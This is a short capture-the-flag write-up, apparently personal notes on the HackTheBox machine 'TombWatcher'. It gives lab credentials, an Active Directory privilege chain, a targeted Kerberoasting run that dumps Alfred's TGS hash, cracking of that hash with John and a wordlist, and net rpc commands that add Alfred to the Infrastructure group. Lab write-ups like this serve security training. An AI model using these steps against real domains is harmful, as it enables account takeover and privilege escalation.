---
title: TombWatcher
date: 2024-07-09
weight: 664
tags:
  - windows
  - easy
  - group-policy-preferences
  - kerberoast
---


cred
```
henry, H3nry_987TGV!
Alfred, basketball
```

```
HENRY@TOMBWATCHER.HTB
  WriteSPN --> ALFRED@TOMBWATCHER.HTB
    AddSelf --> INFRASTRUCTURE@TOMBWATCHER.HTB
      ReadGMSAPassword --> ANSIBLE_DEV$@TOMBWATCHER.HTB
        ForceChangePassword --> SAM@TOMBWATCHER.HTB
          WriteOwner --> JOHN@TOMBWATCHER.HTB

```


```
        WriteSPN                        
henry ───────────► Alfred               
                     │                  
                     │                  
                     │                  
                     │  AddSelf         
                     │                  
                     │                  
                     ▼                  
               INFRASTRUCTURE           
                     │                  
                     │                  
                     │  ReadGMSAPassword
                     │                  
                     ▼                  
               ANSIBLE_DEV$             
```

```bash
┌──(kali㉿kali)-[~]
└─$ targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$003f2b2a65d9b210925260614ad40cf1$1ddca342036a063815ddbd0a775ac34238f5e39cc45e4ced1241274df38af47565cb6907436ea162f27e21741987eb3f8d599a0b931360b8f47fac40e4f2633c87d7018903552f7a69cc162ae5856e05691a3f3485a4b93f54deddf1bd787a9b22bb7e43f27f6d389ad68909bf0db86be046ec40541ce6e7fc9257de9562bfb444f5859e945592a518465dff51981422d7404e35bbede69f6594a9d73467773df25a73fc7a69142795370224aaf44b7c613efe901195c4fc5b7164e27b6b9c9509133575aa888505fc426f0ae9df19cfabf1866ddc07df366f2ac8da0f567336279d4fed60c75d5daf1ecc3c6f92146aa0612dbb887ea077465a58e70a28aa0075e471c77c4bcc8983d25c7fc51cff1aed114726c073f215c9a964a9f4fd967ba8d8befc2143e75a6514efe54d7051b52b7236d147a9da8556b4ebbe04b38eb633a4e2e17fd10e38b9adb5f3d92d784651c691490da548466e94e038bdf88929ee0cff12620a2957cbd3aaccdaf301db6d19870bed98221bea0a76e63d3339f3c1db60272f6fb32c873a03e595c9a5139208e75701bbea5470cde12c3a54b0ba74aa67bf470ddb82a2e369c6d2a806d30826f48da836a4b650c9e2039aa97cee3475c16dd05f2e12e9e86b012b01f4a5614ff0d3f0733064cd28a4fd297f7aa082f1e77a3a55809e44790c637617def90381512d20a02dd7b70720b865d4a13a5932a04214f073e9bd37b1442a9d35be060a4e7ccd0311d30a7fae4e7e83938c942d56a1984137524fbfa3fad0d1c560336efc4c50cd35010381e49c14d211e469b13acbee64d02e94987379c5cc76c2f7ce4ce03a36f02e21845cdd20f6e908a4aecef511cffc1e0cab2a7b0c25244782f16bd1f87f86c11b002ad144bb72a4e959eb0b8aa18b24a558845c2d918e0f932e8573a36918bd674ab8014c09526038954988fc49115f60efc8b9715e1c4453cd9cbd09f7ba9470386888461f7d056ae5c29ab5f9580eb9d68c566e6891884516a12fc5dd10b9f810300a2f19c866e55cdbde6245c8aa96ace4401ab3d26a31ca21716c546201dccebdfa1d9b89f8c4ec0fcc4e01c2a0f8efbd2a8ecf2b3e3c84ed1699a97613e783ed7183b84b3fd454e93b9a22e4a2288ef6264e3b4c4c92b2a94b68d2010a4e276eb94db8480bd2834655ac27f27bc66dae64010537889d0790a47825cf76a1895a1a41392dbd26004b1a8c894479c1a108e6ff5e8b16d3f279c90b61aecce12e59c69966532969150752ddd7bbcf611ffd036553261102e0b15e95e987df31331be51cd821c79751cf7530db561ee1f3a3340f0ff2e25bf32182dd3e5a6ad395db47114d8d426efcb5a37cd10f5a4901e62240e7aeeef78999e7ae6e5b8e0785ee30d62d37b9f1748f4be70e80a48c4de2c4ebaf344a0df9104aba38e855566779e11f6ed96e2c2bb0347c926458f99ba1a824e75aa9d0cb70ed86
[VERBOSE] SPN removed successfully for (Alfred)


┌──(kali㉿kali)-[~/Documents/01_HackTheBox/01_Machines/664_TombWatcher]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                  
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-10-11 09:52) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


net rpc group addmem "Infrastructure" "Alfred" -U "tombwatcher.htb"/"Alfred"%"basketball" -S 10.129.232.167

net rpc group members "Infrastructure" -U "tombwatcher.htb"/"Alfred"%"basketball" -S 10.129.232.167

```
